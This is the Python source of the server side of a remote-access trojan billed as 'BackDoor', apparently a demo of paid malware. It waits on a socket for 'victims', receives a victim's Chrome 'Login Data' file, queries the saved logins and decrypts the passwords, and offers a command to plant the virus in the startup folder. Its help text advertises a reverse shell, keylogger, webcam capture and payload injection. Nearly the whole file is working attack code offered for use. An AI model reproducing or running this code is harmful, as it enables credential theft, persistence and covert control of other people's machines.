try:
    import cv2
    import select
    from pynput.keyboard import Key,Listener,Controller
    import socket
    import os
    import win32crypt
    import sqlite3
    from colorama import *
    import subprocess
    from os import system
except ModuleNotFoundError:
    system("pip install pyperclip")
    system("pip install pywin32")
    system("pip install opencv-python")
    system("pip install pytest-shutil")
    system("pip install pynput")
    system("pip install colorama")
hostname = []
addconnection = []
x = 1
kali = False
kali2 = False
def readfile(gfname):
    file1 = open(gfname,'wb')
    file_data1 = client_socket.recv(6635520)
    file1.write(file_data1)
    file1.close()
def connectDb():
    readfile(gfname='Login Data')
    print("[*]DataBase has been written")
    print("[*]Decrypting")
    dbpath = 'Login Data'
    try:
        connectobj = sqlite3.connect(dbpath)
        cursorobj = connectobj.cursor()
        statment = 'SELECT origin_url,username_value,password_value from logins'
        cursorobj.execute(statment)
        data = cursorobj.fetchall()
        for url,username,password in data:
            password = win32crypt.CryptUnprotectData(password)
            print(f"url:{url} username:{username} password:{password}")
            print("----------------------------------------------------")
    except Exception as ex:
        print(ex)
        print(Fore.RED+"[ERROR]"+Fore.WHITE+"the victim got nothing in his chrome password file")
def data():
    data = client_socket.recv(1024).decode()
    print(data)
try:
    print(Fore.WHITE+"")
    try:
        system('cls')
    except Exception:
        system("clear")
    print('''
     ____             _    _____                   
    |  _ \           | |  |  __ \                  
    | |_) | __ _  ___| | _| |  | | ___   ___  _ __ 
    |  _ < / _` |/ __| |/ / |  | |/ _ \ / _ \| '__|
    | |_) | (_| | (__|   <| |__| | (_) | (_) | |   
    |____/ \__,_|\___|_|\_\_____/ \___/ \___/|_|   
    
    
       ''')
    while kali2 is False:
        kali1 = input("Are you using kali linux? [y/n]\n>")
        if kali1.lower() == 'y':
            print("sorry only the full version support this")
            kali2 = True
        elif kali1.lower() == 'n':
            print("sorry only the full version support this")
            kali2 = True
        else:
            print("I can't understand that")
    choice = input(Fore.RED+"server/client? \n>")
    if choice == 'server':
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind(("0.0.0.0",4555))
        s.listen(100)
        connection = [s]
        while connection:
            readable,_,_ = select.select(connection,[],[])
            for i in readable:
                if i is s:
                    print(Fore.GREEN+"[STARTED] waiting for victims")
                    (client_socket,add) = s.accept()
                    connection.append(client_socket)
                    print(Fore.GREEN+"[INFO]"+f"New victim connected {add}")
                    while True:
                        name = input(">")
                        client_socket.send(name.encode())
                        if name == "passwords":
                            print("[*]connecting..")
                            client_socket.send('passwords'.encode())
                            data()
                            connectDb()
                        if name == 'startup':
                            client_socket.send("startup".encode())
                            data()
                        if name == "help":
                            print('''
                            Hi there , you're using the demo version means you only get the passwords stealer and the startup
                            option
                            here's what you get if you buy the premium:
                            meta - use msfvenom payloads and inject them in your target's computer
                            chat - text with your victim
                            cmd - reverse shell 
                            botnet - you becoming the client and your victim becoming the server, you can log in and out your victim free
                            passwords - steal all of his chrome passwords
                            webcam - take a pic from your victim
                            keylogger - see what your victim's typing
                            startup - inject the virus into the startup folder
                            bg - change your victims's background
                            and more!''')
        if choice == 'client':
            print("sorry this is the demo version")
except KeyboardInterrupt:
     print("goodbye")
except Exception as e:
    print(e)
